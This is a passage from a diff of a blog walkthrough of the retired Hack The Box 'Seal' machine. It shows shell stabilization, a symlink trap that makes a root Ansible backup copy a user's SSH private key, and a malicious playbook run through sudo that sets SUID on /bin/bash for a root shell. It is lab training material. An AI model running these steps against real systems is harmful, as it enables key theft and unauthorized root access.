+<p> <em>Trigger the payload.</em> Many people deploy shells but forget to trigger them. A WAR shell needs an HTTP request to execute the JSP payload. Simply visiting the application's root URL is enough.</p>
+<hr>
 <h3 id="step-16-stabilize-the-shell">Step 16: Stabilize the Shell</h3>
 <pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 </code></pre>
 <p>Then press <strong>Ctrl+Z</strong> on Kali, run <code>stty raw -echo; fg</code>, and press Enter twice.</p>
 <p><strong>Why stabilize:</strong> A basic netcat shell has no job control, no tab completion, and no command history. A PTY shell is much easier to work with for complex enumeration.</p>
-<hr />
+<hr>
 <h2 id="lateral-movement-to-user-luis">Lateral Movement to User (luis)</h2>
 <h3 id="step-17-initial-enumeration-as-tomcat">Step 17: Initial Enumeration as <code>tomcat</code></h3>
 <pre><code class="language-bash" data-language="bash">ls -la /home/
@@ -218,8 +217,8 @@ ps aux | grep -i backup
 <li>A root process runs: <code>/bin/sh -c sleep 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</code></li>
 <li><code>/opt/backups/archives/</code> contains <code>.gz</code> backup files</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>Processes reveal everything.</em> <code>ps aux</code> is one of the most powerful commands for privilege escalation. It shows you what's running, as whom, and with what arguments. A root process that runs <code>sudo -u luis ansible-playbook</code> is immediately suspicious - it's a privileged action being performed on behalf of a lower-privileged user.</p>
-<hr />
+<p> <em>Processes reveal everything.</em> <code>ps aux</code> is one of the most powerful commands for privilege escalation. It shows you what's running, as whom, and with what arguments. A root process that runs <code>sudo -u luis ansible-playbook</code> is immediately suspicious - it's a privileged action being performed on behalf of a lower-privileged user.</p>
+<hr>
 <h3 id="step-18-analyze-the-ansible-playbook">Step 18: Analyze the Ansible Playbook</h3>
 <pre><code class="language-bash" data-language="bash">cat /opt/backups/playbook/run.yml
 </code></pre>
@@ -239,9 +238,9 @@ ps aux | grep -i backup
 </code></pre>
 <p><strong>The Critical Detail:</strong> <code>copy_links=yes</code></p>
 <p><strong>What <code>copy_links=yes</code> means:</strong> The <code>synchronize</code> module (which uses rsync under the hood) will follow symbolic links and copy the TARGET of the symlink, not the symlink itself.</p>
-<p><strong>Hacker Mindset:</strong> <em>Read every configuration file carefully.</em> <code>copy_links=yes</code> is a security anti-pattern in backup scripts. It means: "If you put a symlink in the source directory, the backup will copy whatever the symlink points to." This is essentially an arbitrary file read vulnerability.</p>
-<p><strong>Hacker Mindset:</strong> <em>Symlinks are weapons.</em> In Linux, symlinks are one of the most powerful tools for privilege escalation and path traversal. When a privileged process follows symlinks, it often reads or writes files it shouldn't have access to.</p>
-<hr />
+<p> <em>Read every configuration file carefully.</em> <code>copy_links=yes</code> is a security anti-pattern in backup scripts. It means: "If you put a symlink in the source directory, the backup will copy whatever the symlink points to." This is essentially an arbitrary file read vulnerability.</p>
+<p>Following attacker-controlled symlinks lets a privileged process read or write unintended files.</p>
+<hr>
 <h3 id="step-19-identify-writable-directories-in-the-backup-source">Step 19: Identify Writable Directories in the Backup Source</h3>
 <pre><code class="language-bash" data-language="bash">ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
 </code></pre>
@@ -250,16 +249,16 @@ ps aux | grep -i backup
 drwxrwxrwx 2 root root 4096 May  7  2021 uploads
 </code></pre>
 <p><strong>Key Finding:</strong> <code>uploads</code> is <code>drwxrwxrwx</code> - world-writable!</p>
-<p><strong>Hacker Mindset:</strong> <em>World-writable directories in backup scopes are gold.</em> If a privileged backup process copies a world-writable directory, and that process follows symlinks, you can make it read ANY file that the backup process's user can read.</p>
-<hr />
+<p> <em>World-writable directories in backup scopes are gold.</em> If a privileged backup process copies a world-writable directory, and that process follows symlinks, you can make it read ANY file that the backup process's user can read.</p>
+<hr>
 <h3 id="step-20-create-the-symlink-trap">Step 20: Create the Symlink Trap</h3>
-<pre><code class="language-bash" data-language="bash">cd [redacted encoded lab material]
+<pre><code class="language-bash" data-language="bash">cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
 ln -s /home/luis/.ssh luis-ssh
 ls -la
 </code></pre>
 <p><strong>What this does:</strong> Creates a symlink named <code>luis-ssh</code> pointing to <code>/home/luis/.ssh</code>. When the Ansible backup runs, <code>rsync</code> with <code>copy_links=yes</code> follows this symlink and copies luis's SSH private key into the backup archive.</p>
-<p><strong>Hacker Mindset:</strong> <em>Be patient.</em> The backup runs on a schedule (roughly every minute after a 30-second sleep). You can't rush the cron. Set up your trap and wait.</p>
-<hr />
+<p> <em>Be patient.</em> The backup runs on a schedule (roughly every minute after a 30-second sleep). You can't rush the cron. Set up your trap and wait.</p>
+<hr>
 <h3 id="step-21-wait-for-the-backup-and-extract-the-key">Step 21: Wait for the Backup and Extract the Key</h3>
 <p><strong>Monitor for new backups:</strong></p>
 <pre><code class="language-bash" data-language="bash">ls -la /opt/backups/archives/
@@ -272,8 +271,8 @@ tar -xf backup
 cat dashboard/uploads/luis-ssh/id_rsa
 </code></pre>
 <p><strong>Result:</strong> Luis's SSH private key!</p>
-<p><strong>Hacker Mindset:</strong> <em>Timing is everything.</em> The uploads directory on this machine gets cleaned periodically (likely by the web application). You need to create the symlink and catch the backup before the cleaner removes it. If you miss the window, just recreate the symlink and try again.</p>
-<hr />
+<p> <em>Timing is everything.</em> The uploads directory on this machine gets cleaned periodically (likely by the web application). You need to create the symlink and catch the backup before the cleaner removes it. If you miss the window, just recreate the symlink and try again.</p>
+<hr>
 <h3 id="step-22-ssh-as-luis">Step 22: SSH as <code>luis</code></h3>
 <p>On Kali, save the key:</p>
 <pre><code class="language-bash" data-language="bash">nano luis_id_rsa
@@ -287,8 +286,8 @@ ssh -i luis_id_rsa luis@seal.htb
 cat /home/luis/user.txt
 # abd4808[redacted]ee3469108
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>Keys are better than passwords.</em> SSH keys don't expire, aren't subject to password policies, and often grant access to multiple systems. Once you steal a private key, you own that identity until the key is rotated.</p>
-<hr />
+<p> <em>Keys are better than passwords.</em> SSH keys don't expire, aren't subject to password policies, and often grant access to multiple systems. Once you steal a private key, you own that identity until the key is rotated.</p>
+<hr>
 <h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
 <h3 id="step-23-check-sudo-permissions">Step 23: Check sudo Permissions</h3>
 <pre><code class="language-bash" data-language="bash">sudo -l
@@ -298,10 +297,10 @@ cat /home/luis/user.txt
     (ALL) NOPASSWD: /usr/bin/ansible-playbook *
 </code></pre>
 <p><strong>Translation:</strong> Luis can run <strong>any</strong> Ansible playbook as <strong>root</strong> without a password.</p>
-<p><strong>Hacker Mindset:</strong> <code>sudo -l</code> is the first command you run after gaining any user access. It's the fastest way to find the path to root. A wildcard (<code>*</code>) after a command in sudoers is almost always exploitable.</p>
-<hr />
+<p> <code>sudo -l</code> is the first command you run after gaining any user access. It's the fastest way to find the path to root. A wildcard (<code>*</code>) after a command in sudoers is almost always exploitable.</p>
+<hr>
 <h3 id="step-24-exploit-ansible-playbook-for-root">Step 24: Exploit Ansible-Playbook for Root</h3>
-<p><strong>Why this works:</strong> Ansible playbooks are YAML files that define tasks to be executed on target hosts. When run with <code>sudo</code>, those tasks execute as root. By creating a playbook that runs <code>chmod +s /bin/bash</code>, we grant ourselves a SUID root shell.</p>
+<p><strong>Mechanism:</strong> Ansible playbooks are YAML files that define tasks to be executed on target hosts. When run with <code>sudo</code>, those tasks execute as root. By creating a playbook that runs <code>chmod +s /bin/bash</code>, we grant ourselves a SUID root shell.</p>
 <p><strong>Create the malicious playbook:</strong></p>
 <pre><code class="language-bash" data-language="bash">cd /dev/shm
 cat &gt; root.yml &lt;&lt; 'EOF'
@@ -318,8 +317,8 @@ EOF
 <pre><code>TASK [pwn] ********************************************************************
 changed: [localhost]
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>GTFOBins is your bible.</em> Ansible-playbook is listed on GTFOBins as a sudo exploitation vector. Whenever you see a command with <code>NOPASSWD</code> and a wildcard, check GTFOBins immediately.</p>
-<hr />
+<p> <em>GTFOBins is your bible.</em> Ansible-playbook is listed on GTFOBins as a sudo exploitation vector. Whenever you see a command with <code>NOPASSWD</code> and a wildcard, check GTFOBins immediately.</p>
+<hr>
 <h3 id="step-25-spawn-root-shell">Step 25: Spawn Root Shell</h3>
 <pre><code class="language-bash" data-language="bash">/bin/bash -p
 whoami
@@ -328,8 +327,8 @@ cat /root/root.txt
 # 3309f4d[redacted]92773a5a7
 </code></pre>
 <p><strong>Why <code>/bin/bash -p</code>:</strong> The <code>-p</code> flag tells bash to run in privileged mode, preserving the effective user ID (EUID). Since we set the SUID bit on <code>/bin/bash</code>, running it with <code>-p</code> gives us a root shell.</p>
-<p><strong>Hacker Mindset:</strong> <em>SUID binaries are the classic Unix privilege escalation.</em> Setting the SUID bit on <code>/bin/bash</code> is the nuclear option - it gives you a permanent root shell that works even if your current session dies. Just remember: on a real penetration test, you should clean this up afterward.</p>
-<hr />
+<p>Setting the SUID bit on <code>/bin/bash</code> creates persistent privileged access and must be removed after authorized testing.</p>
+<hr>
 <h2 id="flags">Flags</h2>
 <table aria-label="Flags data table">
 <thead>
@@ -350,8 +349,8 @@ cat /root/root.txt
 <td><code>3309f4[redacted]92773a5a7</code></td>
 </tr>
 </tbody></table>
-<hr />
-<h2 id="hacker-mindset-and-lessons-learned">Hacker Mindset &amp; Lessons Learned</h2>
+<hr>
+<h2 id="lessons-learned">Lessons learned</h2>
 <h3 id="1-the-value-of-commit-history">1. The Value of Commit History</h3>
 <p>Developers are human. They commit credentials, API keys, and secrets. Even when they "fix" their mistake in a later commit, the sensitive data remains in the repository history forever. <strong>Always check commit diffs and history.</strong></p>
 <h3 id="2-reverse-proxies-are-dangerous">2. Reverse Proxies Are Dangerous</h3>
@@ -361,12 +360,12 @@ cat /root/root.txt
 <h3 id="4-processes-don-t-lie">4. Processes Don't Lie</h3>
 <p><code>ps aux</code> reveals cron jobs, backup scripts, and periodic tasks that configuration files might not. A process running as root that touches user-writable directories is always worth investigating.</p>
 <h3 id="5-wildcards-in-sudoers-are-wild">5. Wildcards in sudoers Are Wild</h3>
-<p><code>(ALL) NOPASSWD: /usr/bin/ansible-playbook *</code> means you can run ANY playbook as root. The asterisk is the enemy of security. <strong>Always check <code>sudo -l</code> first.</strong></p>
+<p><code>(ALL) NOPASSWD: /usr/bin/ansible-playbook *</code> permits any playbook path, so a user-controlled playbook can run as root. Check <code>sudo -l</code> when reviewing local privileges.</p>
 <h3 id="6-patience-and-persistence">6. Patience and Persistence</h3>
 <p>The backup trick failed multiple times because the uploads cleaner removed our symlink. We had to recreate it, wait for the exact backup window, and extract quickly. <strong>Real hacking involves failure, iteration, and timing.</strong></p>
 <h3 id="7-suid-is-king">7. SUID Is King</h3>
 <p>When you can't find a clean exploit, making a binary SUID is a reliable way to establish persistent root access. <code>/bin/bash -p</code> is the simplest, most reliable root shell technique on Linux.</p>
-<hr />
+<hr>
 <h2 id="tools-used">Tools Used</h2>
 <ul>
 <li><code>nmap</code> - Port scanning</li>
@@ -376,11 +375,9 @@ cat /root/root.txt
 <li><code>python3 pty</code> - Shell stabilization</li>
 <li><code>ansible-playbook</code> - Root privilege escalation</li>
 </ul>
-<hr />
-<p><em>Happy Hacking!</em> </p>
-e:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$13"}}]
+<hr>e:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$13"}}]
 f:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Search Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-querier-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Querier Walkthrough"}]]}]}]]}]
 10:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-14:T504,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/#article","headline":"Hack The Box: Seal Walkthrough","description":"An archived walkthrough of the retired Hack The Box Seal machine, preserved from Abdullah Kareem's OSEP Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/","datePublished":"2026-06-11T16:06:37.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2510,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-seal-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Seal Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"}]}]}11:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+14:T54d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/#article","headline":"Hack The Box: Seal Walkthrough","description":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root.","url":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/","datePublished":"2026-06-11T16:06:37.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2390,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-seal-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Seal Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-seal-walkthrough/"}]}]}11:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
 12:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
 17:null
